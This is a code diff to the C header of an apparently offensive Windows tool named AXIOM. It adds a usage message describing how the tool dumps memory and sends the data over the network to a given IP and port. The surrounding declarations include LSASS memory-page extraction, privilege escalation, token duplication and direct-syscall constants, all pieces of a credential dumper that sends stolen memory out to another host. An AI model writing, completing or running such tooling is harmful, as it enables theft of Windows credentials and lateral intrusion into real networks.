@@ -5,6 +5,13 @@
 # include <Windows.h>
 # include "Typedefs.h"
 
+# define USAGE_STRING "Usage: %s [/help|/PPcheck <PID>] IP PORT\n\n" \
+	"Examples :\n\n" \
+	".\%s 192.168.1.20 # Dumps and send data over network to the specified IP and PORT\n" \
+	".\%s /PPcheck 720 # Checks protection status of the process identified by PID 720\n" \
+	".\%s /help # Print usage info\n"
+# define PRINT_USAGE(prog_name) printf(USAGE_STRING, prog_name, prog_name, prog_name, prog_name)
+
 # define ARRAY_SIZE(a) (sizeof(a)/sizeof((a)[0]))
 # define RVA(type, base_addr, rva) (type)((ULONG_PTR) base_addr + rva)
 # define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
@@ -15,6 +22,13 @@
 # define SSN_RANGE 0x1e
 # define LDR_POINTER_OFFSET 0x18
 # define MODULE_LIST_POINTER_OFFSET 0x10
+//# define __DEBUG__ // Uncomment this to enable debugging output
+
+# ifdef __DEBUG__
+#  define DEBUG_LOG(...) printf(__VA_ARGS__)
+# else
+#  define DEBUG_LOG(...) (void)0
+# endif
 
 //=============================================================================
 //|                                AXIOM_TABLE                                |
@@ -48,6 +62,7 @@ PDumpMemoryDescriptor64 ELSASS_ExtractMemoryPages(PDUMPCONTEXT dc, PMODULEINFO m
 //=============================================================================
 //|                             Dumper internals                              |
 //=============================================================================
+void AXIOM_PPcheck(char* process_id);
 BOOL AXIOM_PrivCheck();
 BOOL AXIOM_PrivIncrease(LUID luid);
 HANDLE AXIOM_DuplicatePrivilegedToken(LUID luid);
